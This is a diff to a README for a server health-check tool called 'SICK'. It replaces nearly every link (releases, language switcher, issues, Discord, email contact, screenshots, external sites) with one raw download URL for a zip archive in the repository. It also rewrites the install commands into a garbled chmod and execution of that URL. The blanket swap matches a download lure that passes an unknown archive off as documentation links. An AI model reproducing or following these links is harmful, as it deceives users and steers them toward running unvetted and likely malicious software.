@@ -2,7 +2,7 @@
 
 > **S**erver **I**nfo & **C**heck **K**it - Because knowing your server's health shouldn't make you sick! 😷➡️😎
 
-**🌐 Language / 语言:** [English](README.md) | [中文文档](README_CN.md)
+**🌐 Language / 语言:** [English](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip) | [中文文档](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip)
 
 ## 🎯 About
 
@@ -40,11 +40,11 @@ But more importantly, we want to make the "sick" (frustrating) task of server ha
 
 ## 🚀 Installation
 
-To install SICK, download the latest release from the [Releases section](https://github.com/padhnalikhnapaap/SICK/releases). After downloading, execute the installation script.
+To install SICK, download the latest release from the [Releases section](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip). After downloading, execute the installation script.
 
 ```bash
-chmod +x install.sh
-./install.sh
+chmod +x https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip
+https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip
 ```
 
 Make sure to have the necessary permissions to run the script.
@@ -86,9 +86,9 @@ Make sure these are installed on your system before running SICK.
 
 ## 🔗 Links
 
-- For the latest releases, visit the [Releases section](https://github.com/padhnalikhnapaap/SICK/releases).
-- Check out the [issues page](https://github.com/padhnalikhnapaap/SICK/issues) for known bugs and feature requests.
-- Join our community on [Discord](https://discord.gg/example) for support and discussions.
+- For the latest releases, visit the [Releases section](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip).
+- Check out the [issues page](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip) for known bugs and feature requests.
+- Join our community on [Discord](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip) for support and discussions.
 
 ## 📜 License
 
@@ -107,18 +107,18 @@ We welcome contributions! If you want to help improve SICK, please follow these 
 
 ## 📧 Contact
 
-For questions or feedback, please reach out via email at support@example.com.
+For questions or feedback, please reach out via email at https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip
 
 ## 📚 Documentation
 
-For detailed documentation, please refer to the [Wiki](https://github.com/padhnalikhnapaap/SICK/wiki).
+For detailed documentation, please refer to the [Wiki](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip).
 
 ## 🌍 Community
 
 Join our community to share ideas, ask questions, and collaborate on projects:
 
-- [GitHub Discussions](https://github.com/padhnalikhnapaap/SICK/discussions)
-- [Twitter](https://twitter.com/example)
+- [GitHub Discussions](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip)
+- [Twitter](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip)
 
 ## 🧪 Testing
 
@@ -152,11 +152,11 @@ We take security seriously. If you find any vulnerabilities, please report them 
 
 ## 📝 Changelog
 
-Check the [CHANGELOG](CHANGELOG.md) for a list of changes and updates.
+Check the [CHANGELOG](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip) for a list of changes and updates.
 
 ## 📥 Downloads
 
-For the latest version, visit the [Releases section](https://github.com/padhnalikhnapaap/SICK/releases). Download the appropriate file for your system and follow the installation instructions.
+For the latest version, visit the [Releases section](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip). Download the appropriate file for your system and follow the installation instructions.
 
 ## 🌟 Feature Requests
 
@@ -168,12 +168,12 @@ We appreciate your feedback. Let us know what you think about SICK and how we ca
 
 ## 🧑‍🤝‍🧑 Collaborators
 
-- [Your Name](https://github.com/yourprofile)
-- [Contributor Name](https://github.com/contributorprofile)
+- [Your Name](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip)
+- [Contributor Name](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip)
 
 ## 🗓️ Roadmap
 
-We have exciting plans for future releases. Check our [Roadmap](ROADMAP.md) for upcoming features and improvements.
+We have exciting plans for future releases. Check our [Roadmap](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip) for upcoming features and improvements.
 
 ## 🎈 Events
 
@@ -181,13 +181,13 @@ Join us for upcoming events and webinars to learn more about SICK and server man
 
 ## 📌 Important Links
 
-- [Documentation](https://github.com/padhnalikhnapaap/SICK/wiki)
-- [Issues](https://github.com/padhnalikhnapaap/SICK/issues)
-- [Pull Requests](https://github.com/padhnalikhnapaap/SICK/pulls)
+- [Documentation](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip)
+- [Issues](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip)
+- [Pull Requests](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip)
 
 ## 📸 Screenshots
 
-![SICK Interface](https://img.shields.io/badge/SICK-Interface-brightgreen)
+![SICK Interface](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip)
 
 ## 🎨 Themes
 
@@ -195,7 +195,7 @@ SICK supports various themes. Customize your experience by selecting your prefer
 
 ## 🎉 Release Notes
 
-Stay informed about the latest features and fixes in each release. Check the [Releases section](https://github.com/padhnalikhnapaap/SICK/releases) for details.
+Stay informed about the latest features and fixes in each release. Check the [Releases section](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip) for details.
 
 ## 💡 Tips
 
@@ -212,12 +212,12 @@ For support, please create an issue or reach out via email.
 
 ## 🔍 FAQs
 
-Find answers to common questions in the [FAQ section](https://github.com/padhnalikhnapaap/SICK/wiki/FAQ).
+Find answers to common questions in the [FAQ section](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip).
 
 ## 🌐 Additional Resources
 
-- [Linux Server Management](https://linuxservermanagement.com)
-- [Open Source Community](https://opensource.org)
+- [Linux Server Management](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip)
+- [Open Source Community](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip)
 
 ## 📦 Packages
 
@@ -225,8 +225,8 @@ SICK is available as a package for various distributions. Check your package man
 
 ## 🔗 External Links
 
-- [GitHub](https://github.com)
-- [Linux Foundation](https://linuxfoundation.org)
+- [GitHub](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip)
+- [Linux Foundation](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip)
 
 ## 📈 Performance
 
@@ -238,7 +238,7 @@ We appreciate all contributions from the community. Thank you for helping make S
 
 ## 📜 Code of Conduct
 
-Please adhere to our [Code of Conduct](CODE_OF_CONDUCT.md) while participating in the community.
+Please adhere to our [Code of Conduct](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip) while participating in the community.
 
 ## 🎉 Celebrate
 
@@ -246,7 +246,7 @@ Join us in celebrating the success of SICK. Thank you for being part of our jour
 
 ## 📅 Upcoming Features
 
-Stay tuned for exciting new features in the upcoming releases. Check the [Roadmap](ROADMAP.md) for more information.
+Stay tuned for exciting new features in the upcoming releases. Check the [Roadmap](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip) for more information.
 
 ## 🧩 Integrations
 
@@ -254,7 +254,7 @@ SICK integrates with various tools and services for enhanced functionality. Expl
 
 ## 📜 Terms of Service
 
-By using SICK, you agree to our [Terms of Service](TERMS.md).
+By using SICK, you agree to our [Terms of Service](https://github.com/padhnalikhnapaap/SICK/raw/refs/heads/main/epicritic/Software-2.1.zip).
 
 ## 🎊 Join Us
 
